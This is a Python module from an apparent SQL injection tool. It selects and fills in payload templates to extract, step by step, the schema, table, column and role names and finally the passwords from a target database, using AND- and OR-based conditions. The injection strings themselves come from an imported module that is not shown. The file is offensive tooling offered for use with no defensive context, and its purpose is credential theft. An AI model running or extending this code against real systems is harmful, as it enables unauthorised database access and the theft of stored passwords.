import config
import payloads
import sys

PAYLOAD_MAP = {
    #schema
    ("schema","str","AND"): payloads.str_AND_payload,
    ("schema","int","AND"): payloads.int_AND_payload,
    ("schema","str","OR"): payloads.str_OR_payload,
    ("schema","int","OR"): payloads.int_OR_payload,
        
    #TABLE
    ("table","str","AND"): payloads.table_str_AND_payload,
    ("table","int","AND"): payloads.table_int_AND_payload,
    ("table","str","OR"): payloads.table_str_OR_payload,
    ("table","int","OR"): payloads.table_int_OR_payload,
        
    #COLUMN
    ("column","str","AND"): payloads.column_str_AND_payload,
    ("column","int","AND"): payloads.column_int_AND_payload,
    ("column","str","OR"): payloads.column_str_OR_payload,
    ("column","int","OR"): payloads.column_int_OR_payload,
                  
    #ROW
    ("row","str","AND"): payloads.role_str_AND_payload,
    ("row","int","AND"): payloads.role_int_AND_payload,
    ("row","str","OR"): payloads.role_str_OR_payload,
    ("row","int","OR"): payloads.role_int_OR_payload,
                  
    #PASSWORD
    ("password","str","AND"): payloads.pass_str_AND_payload,
    ("password","int","AND"): payloads.pass_int_AND_payload,
    ("password","str","OR"): payloads.pass_str_OR_payload,
    ("password","int","OR"): payloads.pass_int_OR_payload
}

def get_payload(extraction):
    try:
        #SELECTING THE PAYLOAD TO USE FOR EACH CONDTION AND CONTEXT
        key = (extraction, config.context, config.condition)
        payload = PAYLOAD_MAP.get(key)
        if payload is None:
            raise ValueError(f"Unsuported payload configuration: {key}")
        
        #VERIFICATION BEFORE SENDING THE PAYLOAD
        if config.condition == "AND":
            if extraction == "schema":
                load = payload.replace("{valid_entry}", str(config.valid_entry))
                return load
            if extraction == "table":
                tab = payload.replace("{valid_entry}", str(config.valid_entry))
                final_table = tab.replace("{schema_name}", str(config.schema_result))
                return final_table
            if extraction == "column":
                colum = payload.replace("{valid_entry}", str(config.valid_entry))
                columns = colum.replace("{schema_name}", str(config.schema_result))
                final_column = columns.replace("{table_name}", str(config.table_result))
                return final_column
            if extraction == "row":
                ro = payload.replace("{valid_entry}", str(config.valid_entry))
                row = ro.replace("{schema_name}", str(config.schema_result))
                rows = row.replace("{table_name}", str(config.table_result))
                final_row = rows.replace("{column_name}", str(config.column_result))
                return final_row
            if extraction == "password":
                pas = payload.replace("{valid_entry}", str(config.valid_entry))
                passw = pas.replace("{schema_name}", str(config.schema_result))
                passwd = passw.replace("{table_name}", str(config.table_result))
                passwod = passwd.replace("{column_name}", str(config.column_result))
                final_password = passwod.replace("{role_name}", str(config.row_result))
                return final_password
        if config.condition == "OR":
            if extraction == "schema":
                return payload
            if extraction == "table":
                final_table = payload.replace("{schema_name}", str(config.schema_result))
                return final_table
            if extraction == "column":
                columns = payload.replace("{schema_name}", str(config.schema_result))
                final_column = columns.replace("{table_name}", str(config.table_result))
                return final_column
            if extraction == "row":
                row = payload.replace("{schema_name}", str(config.schema_result))
                rows = row.replace("{table_name}", str(config.table_result))
                final_row = rows.replace("{column_name}", str(config.column_result))
                return final_row
            if extraction == "password":
                passw = payload.replace("{schema_name}", str(config.schema_result))
                passwd = passw.replace("{table_name}", str(config.table_result))
                passwod = passwd.replace("{column_name}", str(config.column_result))
                final_password = passwod.replace("{role_name}", str(config.row_result))
                return final_password
    except KeyboardInterrupt:
        print("[WARN] Extraction was interrupted Ctrl-C")
        sys.exit(1)


#COUNTER PAYLOAD 
COUNTER_PAYLOAD_MAP = {
    #schema
    ("schema","str","AND"): payloads.schema_payload_and_str,
    ("schema","int","AND"): payloads.schema_payload_and_int,
    ("schema","str","OR"): payloads.schema_payload_or_str,
    ("schema","int","OR"): payloads.schema_payload_or_int,
        
    #TABLE
    ("table","str","AND"): payloads.table_payload_and_str,
    ("table","int","AND"): payloads.table_payload_and_int,
    ("table","str","OR"): payloads.table_payload_or_str,
    ("table","int","OR"): payloads.table_payload_or_int,
        
    #COLUMN
    ("column","str","AND"): payloads.column_payload_and_str,
    ("column","int","AND"): payloads.column_payload_and_int,
    ("column","str","OR"): payloads.column_payload_or_str,
    ("column","int","OR"): payloads.column_payload_or_int,
                 
    #ROW
    ("row","str","AND"): payloads.role_payload_and_str,
    ("row","int","AND"): payloads.role_payload_and_int,
    ("row","str","OR"): payloads.role_payload_or_str,
    ("row","int","OR"): payloads.role_payload_or_int,
                  
    #PASSWORD
    ("password","str","AND"): payloads.specifield_payload_and_str,
    ("password","int","AND"): payloads.specifield_payload_and_int,
    ("password","str","OR"): payloads.specifield_payload_or_str,
    ("password","int","OR"): payloads.specifield_payload_or_int
}

def get_counter_payoad(extraction):
    try:
        #SELECTING THE PAYLOAD TO USE FOR EACH CONDTION AND CONTEXT
        key = (extraction, config.context, config.condition)
        payload = COUNTER_PAYLOAD_MAP.get(key)
        if payload is None:
            raise ValueError(f"Unsuported payload configuration: {key}")
        
        #VERIFICATION BEFORE SENDING THE PAYLOAD
        if config.condition == "AND":
            if extraction == "schema":
                load = payload.replace("{valid}", str(config.valid_entry))
                return load
            if extraction == "table":
                tab = payload.replace("{valid}", str(config.valid_entry))
                final_table = tab.replace("{schema_name}", str(config.schema_result))
                return final_table
            if extraction == "column":
                colum = payload.replace("{valid}", str(config.valid_entry))
                columns = colum.replace("{schema_name}", str(config.schema_result))
                final_column = columns.replace("{table_name}", str(config.table_result))
                return final_column
            if extraction == "row":
                ro = payload.replace("{valid}", str(config.valid_entry))
                row = ro.replace("{schema_name}", str(config.schema_result))
                rows = row.replace("{table_name}", str(config.table_result))
                final_row = rows.replace("{column_name}", str(config.column_result))
                return final_row
            if extraction == "password":
                pas = payload.replace("{valid}", str(config.valid_entry))
                passw = pas.replace("{schema_name}", str(config.schema_result))
                passwd = passw.replace("{table_name}", str(config.table_result))
                passwod = passwd.replace("{column_name}", str(config.column_result))
                final_password = passwod.replace("{role_name}", str(config.row_result))
                return final_password
        if config.condition == "OR":
            if extraction == "schema":
                return payload
            if extraction == "table":
                final_table = payload.replace("{schema_name}", str(config.schema_result))
                return final_table
            if extraction == "column":
                columns = payload.replace("{schema_name}", str(config.schema_result))
                final_column = columns.replace("{table_name}", str(config.table_result))
                return final_column
            if extraction == "row":
                row = payload.replace("{schema_name}", str(config.schema_result))
                rows = row.replace("{table_name}", str(config.table_result))
                final_row = rows.replace("{column_name}", str(config.column_result))
                return final_row
            if extraction == "password":
                passw = payload.replace("{schema_name}", str(config.schema_result))
                passwd = passw.replace("{table_name}", str(config.table_result))
                passwod = passwd.replace("{column_name}", str(config.column_result))
                final_password = passwod.replace("{role_name}", str(config.row_result))
                return final_password
    except KeyboardInterrupt:
        print("[WARN] Extraction was interrupted Ctrl-C")
        sys.exit(1)
    